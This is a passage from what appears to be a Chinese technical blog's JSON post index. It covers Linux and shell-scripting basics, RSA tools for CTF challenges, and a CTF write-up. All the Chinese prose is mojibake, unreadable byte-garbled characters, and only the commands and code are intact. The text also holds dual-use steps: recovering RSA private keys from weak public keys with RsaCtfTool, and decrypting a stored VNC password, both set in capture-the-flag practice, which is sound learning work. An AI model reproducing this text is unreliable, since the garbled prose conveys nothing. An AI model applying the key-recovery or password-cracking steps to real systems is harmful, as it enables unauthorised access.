auxï¼šè¿™ä¸¤ä¸ªå‘½ä»¤éƒ½æ˜¯æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ­£åœ¨è¿è¡Œè¿›ç¨‹ï¼Œä¸¤è€…çš„åŒºåˆ«æ˜¯å±•ç¤ºæ ¼å¼ä¸åŒã€‚å¦‚æœæƒ³è¦æŸ¥çœ‹ç‰¹å®šçš„è¿›ç¨‹å¯ä»¥ä½¿ç”¨è¿™æ ·çš„æ ¼å¼ï¼šps aux|grep redisï¼ˆæŸ¥çœ‹åŒ…æ‹¬rediså­—ç¬¦ä¸²çš„è¿›ç¨‹ï¼‰\n\næ³¨æ„ï¼šå¦‚æœç›´æ¥ç”¨psï¼ˆï¼ˆProcess Statusï¼‰ï¼‰å‘½ä»¤ï¼Œä¼šæ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹çš„çŠ¶æ€ï¼Œé€šå¸¸ç»“åˆgrepå‘½ä»¤æŸ¥çœ‹æŸè¿›ç¨‹çš„çŠ¶æ€ã€‚\n\nkill -9 è¿›ç¨‹çš„pidï¼šæ€æ­»è¿›ç¨‹ï¼ˆ-9 è¡¨ç¤ºå¼ºåˆ¶ç»ˆæ­¢ã€‚ï¼‰\n\nå…ˆç”¨psæŸ¥æ‰¾è¿›ç¨‹ï¼Œç„¶åç”¨killæ€æ‰\n```\n**ç½‘ç»œé€šä¿¡å‘½ä»¤**ï¼š\n\n```bash\næŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„ç½‘å¡ä¿¡æ¯ï¼šifconfig\n\næŸ¥çœ‹ä¸æŸå°æœºå™¨çš„è¿æ¥æƒ…å†µï¼šping\n\næŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„ç«¯å£ä½¿ç”¨ï¼šnetstat -an\n\nshutdownï¼š\n\nshutdown -h nowï¼šæŒ‡å®šç°åœ¨ç«‹å³å…³æœº\n\nshutdown +5 \"System will shutdown after 5 minutes\":æŒ‡å®š5åˆ†é’Ÿåå…³æœºï¼ŒåŒæ—¶é€å‡ºè­¦å‘Šä¿¡æ¯ç»™ç™»å…¥ç”¨æˆ·ã€‚\n\nrebootï¼šé‡å¯ã€‚\n\nreboot -wï¼šåšä¸ªé‡å¼€æœºçš„æ¨¡æ‹Ÿï¼ˆåªæœ‰çºªå½•å¹¶ä¸ä¼šçœŸçš„é‡å¼€æœºï¼‰ã€‚\n\ngnome-session-quitï¼šæ³¨é”€\n\nlogout:æ³¨é”€ï¼ˆçº¯å‘½ä»¤æ¨¡å¼ä¸‹ï¼‰\n```\n\n## æ–‡æœ¬å¤„ç†ä¸‰å‰‘å®¢--grepã€sedã€awk\n\nè¯·çœ‹æˆ‘å¦å¤–ä¸€ç¯‡æ–‡ç« ï¼šhttps://jwt1399.top/posts/22718.html\n\n## Linuxä¸‹Shellç¼–ç¨‹\n\n```shell\n#!/bin/bash\necho \"å¼€å§‹å­¦ä¹ shell !\"\n```\n\n`#!`(Shebang) å‘Šè¯‰ç³»ç»Ÿè¿™ä¸ªè„šæœ¬éœ€è¦ä»€ä¹ˆè§£é‡Šå™¨æ¥æ‰§è¡Œï¼Œå³ä½¿ç”¨å“ªä¸€ç§ Shellã€‚\n\n### è¿è¡Œæ–¹æ³•\n\n```bash\nchmod +x ./test.sh  #ä½¿è„šæœ¬å…·æœ‰æ‰§è¡Œæƒé™\n./test.sh  #æ‰§è¡Œè„šæœ¬\n```\n\n### æ–‡ä»¶è¡¨è¾¾å¼\n\n```shell\n-e filename å¦‚æœ filenameå­˜åœ¨ï¼Œåˆ™ä¸ºçœŸ\n-d filename å¦‚æœ filenameä¸ºç›®å½•ï¼Œåˆ™ä¸ºçœŸ \n-f filename å¦‚æœ filenameä¸ºå¸¸è§„æ–‡ä»¶ï¼Œåˆ™ä¸ºçœŸ\n-L filename å¦‚æœ filenameä¸ºç¬¦å·é“¾æ¥ï¼Œåˆ™ä¸ºçœŸ\n-r filename å¦‚æœ filenameå¯è¯»ï¼Œåˆ™ä¸ºçœŸ \n-w filename å¦‚æœ filenameå¯å†™ï¼Œåˆ™ä¸ºçœŸ \n-x filename å¦‚æœ filenameå¯æ‰§è¡Œï¼Œåˆ™ä¸ºçœŸ\n-s filename å¦‚æœæ–‡ä»¶é•¿åº¦ä¸ä¸º0ï¼Œåˆ™ä¸ºçœŸ\n-h filename å¦‚æœæ–‡ä»¶æ˜¯è½¯é“¾æ¥ï¼Œåˆ™ä¸ºçœŸ\nfilename1 -nt filename2 å¦‚æœ filename1æ¯” filename2æ–°ï¼Œåˆ™ä¸ºçœŸã€‚\nfilename1 -ot filename2 å¦‚æœ filename1æ¯” filename2æ—§ï¼Œåˆ™ä¸ºçœŸã€‚\n```\n\n### æ•´æ•°å˜é‡è¡¨è¾¾å¼\n\n```shell\n-eq ç­‰äº\n-ne ä¸ç­‰äº\n-gt å¤§äº\n-ge å¤§äºç­‰äº\n-lt å°äº\n-le å°äºç­‰äº\n```\n\n**test å‘½ä»¤**\n\n> shellä¸­çš„ test å‘½ä»¤ç”¨äºæ£€æŸ¥æŸä¸ªæ¡ä»¶æ˜¯å¦æˆç«‹ï¼Œå®ƒå¯ä»¥è¿›è¡Œæ•°å€¼ã€å­—ç¬¦å’Œæ–‡ä»¶ä¸‰ä¸ªæ–¹é¢çš„æµ‹è¯•ã€‚\n\n```shell\nnum1=100\nnum2=100\nif test $[num1] -eq $[num2]\nthen\n    echo 'ä¸¤ä¸ªæ•°ç›¸ç­‰ï¼'\nelse\n    echo 'ä¸¤ä¸ªæ•°ä¸ç›¸ç­‰ï¼'\nfi\n```\n\n\n\n### å­—ç¬¦ä¸²å˜é‡è¡¨è¾¾å¼\n\n```shell\nif  [ $a = $b ]                 å¦‚æœstring1ç­‰äºstring2ï¼Œåˆ™ä¸ºçœŸ,å­—ç¬¦ä¸²å…è®¸ä½¿ç”¨èµ‹å€¼å·åšç­‰å·           if  [ $string1 !=  $string2 ]   å¦‚æœstring1ä¸ç­‰äºstring2ï¼Œåˆ™ä¸ºçœŸ       \nif  [ -n $string  ]             å¦‚æœstring éç©º(é0ï¼‰ï¼Œè¿”å›0(true)  \nif  [ -z $string  ]             å¦‚æœstring ä¸ºç©ºï¼Œåˆ™ä¸ºçœŸ\nif  [ $sting ]                  å¦‚æœstring éç©ºï¼Œè¿”å›0 (å’Œ-nç±»ä¼¼) \nif  [ ! è¡¨è¾¾å¼ ]\t\t\t\t  é€»è¾‘é !    æ¡ä»¶è¡¨è¾¾å¼çš„ç›¸å\nif  [ ! -d $num ]               å¦‚æœä¸å­˜åœ¨ç›®å½•$num\nif  [ è¡¨è¾¾å¼1  â€“a  è¡¨è¾¾å¼2 ]      é€»è¾‘ä¸ â€“a     æ¡ä»¶è¡¨è¾¾å¼çš„å¹¶åˆ—\nif  [ è¡¨è¾¾å¼1  â€“o è¡¨è¾¾å¼2 ]       é€»è¾‘æˆ– -o     æ¡ä»¶è¡¨è¾¾å¼çš„æˆ–\n```\n\n### ç‰¹æ®Šå˜é‡\n\n| $#   | ä¼ é€’åˆ°è„šæœ¬çš„å‚æ•°ä¸ªæ•°                                         |\n| ---- | ------------------------------------------------------------ |\n| $*   | ä»¥ä¸€ä¸ªå•å­—ç¬¦ä¸²æ˜¾ç¤ºæ‰€æœ‰å‘è„šæœ¬ä¼ é€’çš„å‚æ•°ã€‚ å¦‚\"$*\"ç”¨ã€Œ\"ã€æ‹¬èµ·æ¥çš„æƒ…å†µã€ä»¥\"$1 $2 â€¦ $n\"çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚ |\n| $$   | è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå·                                       |\n| $!   | åå°è¿è¡Œçš„æœ€åä¸€ä¸ªè¿›ç¨‹çš„IDå·                                 |\n| $@   | ä¸$*ç›¸åŒï¼Œä½†æ˜¯ä½¿ç”¨æ—¶åŠ å¼•å·ï¼Œå¹¶åœ¨å¼•å·ä¸­è¿”å›æ¯ä¸ªå‚æ•°ã€‚ å¦‚\"$@\"ç”¨ã€Œ\"ã€æ‹¬èµ·æ¥çš„æƒ…å†µã€ä»¥\"$1\" \"$2\" â€¦ \"$n\" çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚ |\n| $-   | æ˜¾ç¤ºShellä½¿ç”¨çš„å½“å‰é€‰é¡¹ï¼Œä¸[setå‘½ä»¤](https://www.runoob.com/linux/linux-comm-set.html)åŠŸèƒ½ç›¸åŒã€‚ |\n| $?   | æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ã€‚0è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–ä»»ä½•å€¼è¡¨æ˜æœ‰é”™è¯¯ã€‚ |\n\n### Shellç®—æœ¯è¿ç®—\n\n**1ã€expr expression**\n\n```sh\negï¼šexpr  $a + $b\n```\n\næ³¨æ„ï¼šåœ¨ä½¿ç”¨expræ—¶ï¼Œè¿ç®—ç¬¦å‰åè¦æœ‰ç©ºæ ¼ï¼Œä¸”ä¹˜æ³•è¦ç”¨`\\`è½¬ä¹‰ï¼Œå³`\\*`çš„å½¢å¼ã€‚\n\n**2ã€$((expression))**\n\n```shell\neg: $((a+b))\n```\n\n**3ã€letå‘½ä»¤**\n\n```shell\neg: let c=a+b\n```\n\n### ifè¯­å¥\n\n```shell\nif condition1\nthen\n\tcommand1\nelif condition2\n\tcommand2\nelse\n\tcommandN\nfi\n```\n\n### forè¯­å¥\n\n```shell\n#Cé£æ ¼çš„for\nfor var in item1 item2 ... itemN\ndo\n\tcommand1\n\tcommand2\n\t...\n\tcommandN\ndone\n```\n\n```shell\nfor (( EXP1; EXP2; EXP3 ))\ndo\n\tcommand1\n\tcommand2\n\tcommand3\ndone\n```\n\n**å¾ªç¯å¸¸è§åœºæ™¯ï¼š**\n\nå†™æˆä¸€è¡Œdoå‰é¢è¦åŠ åˆ†å·\n\n```shell\n#1ã€æœ‰é™æ•°å­—ï¼ˆç”¨ç©ºæ ¼éš”å¼€ï¼‰\nfor i in 1 2 3 4 5;do echo $i ;doneã€€\n\n#2ã€åºåˆ—æ•°æ®ï¼ˆseq å¼€å§‹ æ­¥é•¿ æœ€åï¼‰ ---æ­¥é•¿é»˜è®¤1\nfor i in $(seq 1 3 100); do echo $i ;done\n\n#3ã€å‘½ä»¤ç»“æœï¼ˆé»˜è®¤ç©ºæ ¼ä¸ºåˆ†éš”ç¬¦ï¼‰\nfor i in `cat 01.txt`;do echo $i ;done\nfor i in `ls | grep \"heh\"`;do echo $i ;done\n\n#4ã€è¯­æ³•å¾ªç¯ï¼ˆç±»ä¼¼Cï¼Œæ³¨æ„ä¸ºåŒæ‹¬å·,åˆ†å·éš”å¼€ï¼‰\nfor ((i=1;i<3;i+=2));do echo i ;done\nfor ((;;);do echo\"æ— é™å¾ªç¯\";done\n\n```\n\n### whileè¯­å¥\n\n```shell\nwhile [ condition ]\ndo\n\tcommand\ndone\n```\n### untilè¯­å¥\n\nuntilè¯­å¥ä¸whileè¯­å¥ä¸€æ ·ï¼Œéƒ½æ˜¯å¾ªç¯è¯­å¥ï¼Œä½†å¤„ç†æ–¹å¼æ­£å¥½ç›¸åï¼Œå³`å½“åˆ¤æ–­æ¡ä»¶ä¸ºçœŸæ—¶ï¼Œå¾ªç¯åœæ­¢`ã€‚\n\n```shell\nuntil condition\ndo\n\tcommand\ndone\n```\n\n### caseè¯­å¥\n\ncaseçš„è¯­æ³•å’ŒC familyè¯­è¨€å·®åˆ«å¾ˆå¤§ï¼Œå®ƒéœ€è¦ä¸€ä¸ªesacï¼ˆå°±æ˜¯caseåè¿‡æ¥ï¼‰ä½œä¸ºç»“æŸæ ‡è®°ï¼Œæ¯ä¸ªcaseåˆ†æ”¯ç”¨å³åœ†æ‹¬å·ï¼Œç”¨ä¸¤ä¸ªåˆ†å·è¡¨ç¤ºbreak\n\n```shell\n#!/bin/bash\necho \"please enter the number of the week:\"\nread number\ncase $number in\n 1) echo \"Monday\";;\n 2) echo \"Tuesday\";;\n 3) echo \"Wednsday\";;\n 4) echo \"Thursday\";;\n 5) echo \"Friday\";;\n 6) echo \"saturday\";;\n 7) echo \"Sunday\";;\n *) echo \"your enter must be in 1-7.\";;\nesac\n```\n\ncaseæ”¯æŒåˆå¹¶åŒ¹é…æ¨¡å¼ï¼Œå³åœ¨æ¯ä¸€ä¸ªæ¨¡å¼ä¸­ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦æˆ–é€»è¾‘ç¬¦å·ã€‚\n\n```shell\n#! /bin/bash\necho \"please input score:\"\nread score\nlet score/=10\ncase $score in\n0|1|2|3|4|5) echo \"ä¸åŠæ ¼\";;\n6) echo \"åŠæ ¼\";;\n7|8) echo \"è‰¯å¥½\";;\n9|10) echo \"ä¼˜ç§€\";;\n*) echo \"é”™è¯¯\";;\nesac\n```\n\n### Shell å‡½æ•°\n\n```shell\n[ function ] funname [()]\n{\n    action;\n    [return int;]\n}\n```\n\nå¯ä»¥å¸¦function funname() å®šä¹‰ï¼Œä¹Ÿå¯ä»¥ç›´æ¥funname() å®šä¹‰,ä¸å¸¦ä»»ä½•å‚æ•°ã€‚\n\nç¤ºä¾‹ï¼š\n\n```shell\nadd()\n{\n\techo \"input a:\"\n\tread a\n\techo \"input b:\"\n\tread b\n\techo -n \"a+b=\"\n\treturn $(($a+$b))\n}\nadd\nexho $?\n```\n\n\n\nå‚è€ƒï¼š\n[CSåŸºç¡€ï¼šLinuxåŸºç¡€ï¼ˆ1ï¼‰](https://mp.weixin.qq.com/s/C8kv8itPU1wHYGaH3tG9zg)\n[CSåŸºç¡€ï¼šLinuxåŸºç¡€ï¼ˆ2ï¼‰](https://mp.weixin.qq.com/s/-eANH2n_IDo6ojyP3RdeDA)\n\n\n\n","tags":["Linux"],"categories":["CSåŸºç¡€"]},{"title":"RSAå·¥å…·é›†-openssl,rsatool,RsaCtfTool,RSAtool","url":"/posts/49954.html","content":"![img](https://img.jwt1399.top//img/20200824183710.png)\n\n## openssl\n\n>OpenSSL æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œå…¶ç»„æˆä¸»è¦åŒ…æ‹¬ä¸€ä¸‹ä¸‰ä¸ªç»„ä»¶ï¼š\n    opensslï¼šå¤šç”¨é€”çš„å‘½ä»¤è¡Œå·¥å…·\n    libcryptoï¼šåŠ å¯†ç®—æ³•åº“\n    libsslï¼šåŠ å¯†æ¨¡å—åº”ç”¨åº“ï¼Œå®ç°äº†sslåŠtls\n\n  opensslå¯ä»¥å®ç°ï¼šç§˜é’¥è¯ä¹¦ç®¡ç†ã€å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†Â ã€‚\n\nRSA PEMæ–‡ä»¶æ ¼å¼\n\n**1**.PEMç§é’¥æ ¼å¼æ–‡ä»¶\n```\n-----BEGIN RSA PRIVATE KEY-----\n-----END RSA PRIVATE KEY-----\n```\n\n**2**. PEMå…¬é’¥æ ¼å¼æ–‡ä»¶\n```\n-----BEGIN PUBLIC KEY-----\n-----END PUBLIC KEY-----\n```\n**3**. PEM RSAPublicKeyå…¬é’¥æ ¼å¼æ–‡ä»¶\n\n```\n-----BEGIN RSA PUBLIC KEY-----\n-----END RSA PUBLIC KEY-----\n```\n**OpenSSLå¯†é’¥ç›¸å…³å‘½ä»¤**\n**1**. ç”Ÿæˆå¯†é’¥\n```bash\nopenssl genrsa -out key.pem 1024\n    -out æŒ‡å®šç”Ÿæˆæ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶åŒ…å«å…¬é’¥å’Œç§é’¥ä¸¤éƒ¨åˆ†ï¼Œæ‰€ä»¥å³å¯ä»¥åŠ å¯†ï¼Œä¹Ÿå¯ä»¥è§£å¯†\n    1024 ç”Ÿæˆå¯†é’¥çš„é•¿åº¦\n```\n**2**. æå–PEMæ ¼å¼å…¬é’¥\n```bash\nopenssl rsa -in key.pem -pubout -out pubkey.pem\n    -in æŒ‡å®šè¾“å…¥çš„å¯†é’¥æ–‡ä»¶\n    -out æŒ‡å®šæå–ç”Ÿæˆå…¬é’¥çš„æ–‡ä»¶(PEMå…¬é’¥æ ¼å¼)\n```\n**3**. æå–PEM RSAPublicKeyæ ¼å¼å…¬é’¥\n```bash\nopenssl rsa -in key.pem -RSAPublicKey_out -out pubkey.pem\n    -in æŒ‡å®šè¾“å…¥çš„å¯†é’¥æ–‡ä»¶\n    -out æŒ‡å®šæå–ç”Ÿæˆå…¬é’¥çš„æ–‡ä»¶(PEM RSAPublicKeyæ ¼å¼)\n```\n**4**. å…¬é’¥åŠ å¯†æ–‡ä»¶\n```bash\nopenssl rsautl -encrypt -in input.file -inkey pubkey.pem -pubin -out output.file\n    -in æŒ‡å®šè¢«åŠ å¯†çš„æ–‡ä»¶\n    -inkey æŒ‡å®šåŠ å¯†å…¬é’¥æ–‡ä»¶\n    -pubin è¡¨é¢æ˜¯ç”¨çº¯å…¬é’¥æ–‡ä»¶åŠ å¯†\n    -out æŒ‡å®šåŠ å¯†åçš„æ–‡ä»¶\n```\n**5**. ç§é’¥è§£å¯†æ–‡ä»¶\n```bash\nopenssl rsautl -decrypt -in input.file -inkey key.pem -out output.file\n    -in æŒ‡å®šéœ€è¦è§£å¯†çš„æ–‡ä»¶\n    -inkey æŒ‡å®šç§é’¥æ–‡ä»¶\n    -out æŒ‡å®šè§£å¯†åçš„æ–‡ä»¶\n```\n**ras**Â çš„ç”¨æ³•å¦‚ä¸‹ï¼š\n```bash\nopenssl rsa [-inform PEM|NET|DER] [-outform PEM|NET|DER] [-in filename] [-passin arg] [-out filename] [-passout arg]\n       [-sgckey] [-des] [-des3] [-idea] [-text] [-noout] [-modulus] [-check] [-pubin] [-pubout] [-engine id]</pre>\n\nå¸¸ç”¨é€‰é¡¹ï¼š\n\n-in filenameï¼šæŒ‡æ˜ç§é’¥æ–‡ä»¶\n-out filenameï¼šæŒ‡æ˜å°†æå–å‡ºçš„å…¬é’¥ä¿å­˜è‡³æŒ‡å®šæ–‡ä»¶ä¸­Â \n-pubin:æ ¹æ®å…¬é’¥æå–å‡ºç§é’¥\n-puboutï¼šæ ¹æ®ç§é’¥æå–å‡ºå…¬é’¥Â \n```\nç¤ºä¾‹å¦‚ä¸‹ï¼š\n![](https://i.loli.net/2019/07/17/5d2ee290dd00071030.png)\n\n## rsatool\n**å®‰è£…**ï¼š\n```bash\ngit clone https://github.com/ius/rsatool.git\ncd rsatool  //è¿›å…¥è¿™ä¸ªç›®å½•\npython setup.py install\n```\næä¾›æ¨¡æ•°å’Œç§æœ‰æŒ‡æ•°ï¼ŒPEMè¾“å‡ºåˆ°key.pemï¼š\n```bash\npython rsatool.py -f PEM -o key.pem -n 13826123222358393307 -d 9793706120266356337\n```\næä¾›ä¸¤ä¸ªç´ æ•°ï¼ŒDERè¾“å‡ºåˆ°key.derï¼š\n```bash\npython rsatool.py -f DER -o key.der -p 4184799299 -q 3303891593\n```\né¡¹ç›®åœ°å€:https://github.com/ius/rsatool\n## RsaCtfTool\n**å®‰è£…**ï¼š\n```bash\nå®‰è£…ä¹‹å‰å¿…é¡»å…ˆå®‰è£…è¿™å››ä¸ªåº“(PyCrypto,GMPY2,SymPy,requests)\n\ngit clone https://github.com/Ganapati/RsaCtfTool.git \ncd RsaCtfTool  //è¿›å…¥è¿™ä¸ªç›®å½•\nå®‰è£…pythonç¬¬ä¸‰æ–¹åº“\npip install -r requirements.txt\n\n```\n**ç”¨æ³•ä¸€**ï¼šå·²çŸ¥å…¬é’¥(è‡ªåŠ¨æ±‚ç§é’¥) â€“publickeyï¼Œå¯†æ–‡ â€”-uncipherfileã€‚\nå°†æ–‡ä»¶è§£å‹å¤åˆ¶åˆ°RsaCtfToolé‡Œï¼š\n```bash\npython RsaCtfTool.py --publickey å…¬é’¥æ–‡ä»¶ --uncipherfile åŠ å¯†çš„æ–‡ä»¶\n```\n![](https://i.loli.net/2019/07/17/5d2ee417c580785483.png)\n**ç”¨æ³•äºŒ**ï¼šå·²çŸ¥å…¬é’¥æ±‚ç§é’¥ã€‚\n```bash\nRsaCtfTool.py --publickey å…¬é’¥æ–‡ä»¶ --private\n```\n![](https://i.loli.net/2019/07/17/5d2ee3dc1bc6f77134.png)\n**ç”¨æ³•ä¸‰**ï¼šå¯†é’¥æ ¼å¼è½¬æ¢â€”â€”æŠŠPEMæ ¼å¼çš„å…¬é’¥è½¬æ¢ä¸ºnï¼Œe\n```bash\npython RsaCtfTool.py --dumpkey --key å…¬é’¥æ–‡ä»¶\numpkey --key å…¬é’¥æ–‡ä»¶\n```\n![](https://i.loli.net/2019/07/17/5d2ee3b44a24342430.png)\n**ç”¨æ³•å››**ï¼šå¯†é’¥æ ¼å¼è½¬æ¢â€”â€”æŠŠn,eè½¬æ¢ä¸ºPEMæ ¼å¼\n```bash\npython RsaCtfTool.py --createpub -n 782837482376192871287312987398172312837182 -e 65537\n```\n![](https://i.loli.net/2019/07/17/5d2ee35e11f2039360.png)\né¡¹ç›®åœ°å€:https://github.com/Ganapati/RsaCtfTool\n\n## RSAtool\nä¸‹è½½åœ°å€ï¼šhttp://www.skycn.net/soft/appid/39911.html\n`RSAtool `æ˜¯ä¸€ä¸ªéå¸¸æ–¹ä¾¿å®ç”¨çš„å°å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥è®¡ç®— RSA ä¸­çš„å‡ ä¸ªå‚æ•°ã€ç”Ÿæˆå¯†é’¥ã€åŠ è§£å¯†ï¼Œä¸€äº›ä¸å¤ªå¤æ‚çš„ç ´è§£å·¥ä½œä¹Ÿå¯ä»¥ç”¨å®ƒã€‚\næˆ‘ä»¬æ‰¾ä¸€é“é¢˜ä¸ºä¾‹ï¼Œæ¥çœ‹çœ‹ RSAtool çš„åŸºæœ¬ç”¨æ³•ã€‚\n>è¿˜è®°å¾— veryeasy RSA å—ï¼Ÿæ˜¯ä¸æ˜¯ä¸éš¾ï¼Ÿé‚£ç»§ç»­æ¥çœ‹çœ‹è¿™é¢˜å§ï¼Œè¿™é¢˜ä¹Ÿä¸éš¾ã€‚ \nå·²çŸ¥ä¸€æ®µ RSA åŠ å¯†çš„ä¿¡æ¯ä¸ºï¼š0xdc2eeeb2782c ä¸”å·²çŸ¥åŠ å¯†æ‰€ç”¨çš„å…¬é’¥ï¼š \n(N=322831561921859 e = 23) \nè¯·è§£å¯†å‡ºæ˜æ–‡ï¼Œæäº¤æ—¶è¯·å°†æ•°å­—è½¬åŒ–ä¸º ascii ç æäº¤ \næ¯”å¦‚ä½ è§£å‡ºçš„æ˜æ–‡æ˜¯ 0x6162ï¼Œé‚£ä¹ˆè¯·æäº¤å­—ç¬¦ä¸² ab \næäº¤æ ¼å¼ï¼šPCTF {æ˜æ–‡å­—ç¬¦ä¸²}\n\nè¿™é“é¢˜å¯ä»¥ç”¨ Python ç®—å‡ºæ¥,ç”¨ RSAtool å¯ä»¥æ›´æ–¹ä¾¿ï¼Œå› ä¸ºä¸ç”¨è‡ªå·±å»å†™è„šæœ¬ã€‚\n![](https://i.loli.net/2019/07/17/5d2ee91e7a76c90913.png)\nå›¾ä¸­çš„ `P`ã€`Q`ã€`R`ã€`D`ã€`E` åˆ†åˆ«å°±æ˜¯ RSA ç®—æ³•ä¸­çš„ `p`ã€`q`ã€`N`ã€`d`ã€`e`ï¼Œå³ä¸Šè§’é€‰æ‹©è¿›åˆ¶ï¼Œæ³¨æ„ä¸è¦å¼„é”™ï¼Œe åªæœ‰åå…­è¿›åˆ¶å¯ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œè¦æŠŠ `23` æ¢æˆ `17`ã€‚\nå°†` N=322831561921859` å¡«å…¥ï¼Œå·¦ä¸‹è§’æœ‰ä¸€ä¸ª `Factor N` çš„æŒ‰é’®ï¼Œè¿™æ˜¯åˆ†è§£ `N` çš„æ„æ€ï¼Œç‚¹ä¸€ä¸‹ï¼Œä¼šè‡ªåŠ¨å¼€å§‹åˆ†è§£å› æ•°ï¼Œå¾—åˆ° `P=13574881`ã€Q=23781539ï¼Œå†ç‚¹ä¸€ä¸‹ `Calc. D`ï¼Œè®¡ç®—å‡º`d=42108459725927`ï¼Œè¿™æ—¶å¯ä»¥çœ‹åˆ° `Test` æŒ‰é’®ä¸å†æ˜¯ç°è‰²ï¼Œè¡¨æ˜å¯ä»¥ä½¿ç”¨ç®€å•çš„åŠ è§£å¯†åŠŸèƒ½ï¼Œç‚¹å®ƒï¼Œå¼¹å‡ºä¸€ä¸ªæ¡†ã€‚\n ![](https://i.loli.net/2019/07/17/5d2ee9383312d23972.png)\nç¬¬ä¸€ä¸ªæ¡†æ˜¯æ˜æ–‡ï¼Œç¬¬äºŒä¸ªæ¡†æ˜¯å¯†æ–‡ï¼Œè¾“å…¥æ˜æ–‡ `6162`ï¼Œç‚¹å‡» `Encrypt`ï¼Œå¾—åˆ°å¯†æ–‡ `178401292768926`ï¼Œè¿™æ—¶å°±å¯ä»¥ä½¿ç”¨è§£å¯†åŠŸèƒ½ï¼ˆå¥½åƒå¿…é¡»å…ˆç”¨ä¸€æ¬¡åŠ å¯†æ‰è¡Œï¼‰ã€‚\nå¯†æ–‡ `0xdc2eeeb2782c`ï¼Œæ¢ç®—åè¿›åˆ¶ `242094131279916`ï¼Œç‚¹ `Decrypt`ï¼Œç›´æ¥å¾—åˆ°å­—ç¬¦ä¸² `3a5Y`ã€‚\n\nå‚è€ƒï¼š\n[Ubuntuä¸‹RsaCtfToolçš„å®‰è£…åŠä½¿ç”¨](https://www.freebuf.com/sectool/185468.html)\n[RSA å¸¸ç”¨å·¥å…·ä»‹ç»](https://www.40huo.cn/blog/rsa-tools.html)\n","tags":["RSAå·¥å…·"],"categories":["CTF"]},{"title":"å®‰æ’ä¸ƒæœˆæœˆèµ›","url":"/posts/49404.html","content":"## Misc\n\n### çœŸæ­£çš„CTFer\nä¸‹è½½é™„ä»¶å¾—åˆ°ä¸€å¼ å›¾ç‰‡`1.png`\n![](https://i.loli.net/2019/07/15/5d2c586f9efb647980.png)\nå°†å›¾ç‰‡æ‹–è¿›HxD,ä¿®æ”¹å›¾ç‰‡é«˜åº¦ï¼Œå°†05æ”¹ä¸º10\n![](https://i.loli.net/2019/07/15/5d2c5a3e5be1917063.png)\nä¿®æ”¹åä¿å­˜ï¼Œå¾—åˆ°å¦‚ä¸‹å›¾ç‰‡\n![](https://i.loli.net/2019/07/15/5d2c5aeb0c67410845.png)\næ”¾å¤§å›¾ç‰‡ï¼Œå¾—åˆ°flag\n![](https://i.loli.net/2019/07/15/5d2c5b34504bc17912.png)\n### è§£ä¸å¼€çš„ç§˜å¯†\nä¸‹è½½é™„ä»¶å¾—åˆ°å¦‚ä¸‹ä¸¤ä¸ªæ–‡ä»¶\n![](https://i.loli.net/2019/07/15/5d2c5b7fe0d1758729.png)\næ‰“å¼€`file`,å¾—åˆ°ä¸€é•¿ä¸²16è¿›åˆ¶æ•°æ®\n![](https://i.loli.net/2019/07/15/5d2c5bfed220143050.png)\næ‰“å¼€`flag.docx`,å‘ç°éœ€è¦å¯†ç \n![](https://i.loli.net/2019/07/15/5d2c5c47724b233052.png)\nç”±æ­¤æ¨æµ‹åº”è¯¥æ˜¯é€šè¿‡ç¬¬ä¸€ä¸ªæ–‡ä»¶å¾—åˆ°å¯†ç ï¼Œç„¶åæ‰“å¼€ç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œå¾—åˆ°flag\nå°†`file`ä¸­16è¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²\n![](https://i.loli.net/2019/07/15/5d2c5d303679f61453.png)\nè½¬æ¢åå¾—åˆ°ä¸€æ®µbase64\n![](https://i.loli.net/2019/07/15/5d2c5d8c53d5f36372.png)\nè§£å¯†base64ä¹‹å,çˆ†å‡ºæ³¨å†Œè¡¨ä¿¡æ¯ï¼Œå‘ç°passwordå…³é”®å­—ï¼Œé€šè¿‡æŸ¥è¯¢è¿™æ˜¯VNCå¯†ç \n![](https://i.loli.net/2019/07/15/5d2c5df51a02964636.png)\né€šè¿‡VNCå¯†ç è§£å¯†å·¥å…·(K8fcukVNC4)å¾—åˆ°å¯†ç \n![](https://i.loli.net/2019/07/15/5d2c612d1f00431128.png)\nè¾“å…¥å¯†ç åï¼Œå¾—åˆ°ä¸‹å›¾\n![](https://i.loli.net/2019/07/15/5d2c61959709055071.png)\nCtrl+aå…¨é€‰ï¼Œå°†å­—ä½“é¢œè‰²æ”¹ä¸ºé»‘è‰²ï¼Œæ‹–åŠ¨å›¾ç‰‡ï¼Œå‘ç°flag\n![](https://i.loli.net/2019/07/15/5d2c6215b035a48221.png)\nå‚è€ƒ:[ç ´è§£vncå¯†ç ](https://blog.51cto.com/darren/587007)\n### ä¸‰è¡Œä»£ç æŠµå¾¡æ”»å‡»\næ ¹æ®`ã€Šäº²çˆ±çš„,çƒ­çˆ±çš„ã€‹`ç”µè§†å‰§æƒ…èŠ‚\n![](https://i.loli.net/2019/07/15/5d2c63f8735c484003.png)\nç›´æ¥ncè¿æ¥ä¾æ¬¡è¾“å…¥å›¾ä¸­ä¸‰è¡Œä»£ç ï¼Œå¾—åˆ°flag\n![](https://i.loli.net/2019/07/15/5d2c629f2e91e19287.png)\n","tags":["Write-up"],"categories":["CTF"]},{"title":"æ”»é˜²ä¸–ç•Œ-Crypto-è¿›é˜¶","url":"/posts/58189.html","content":"## ä½ 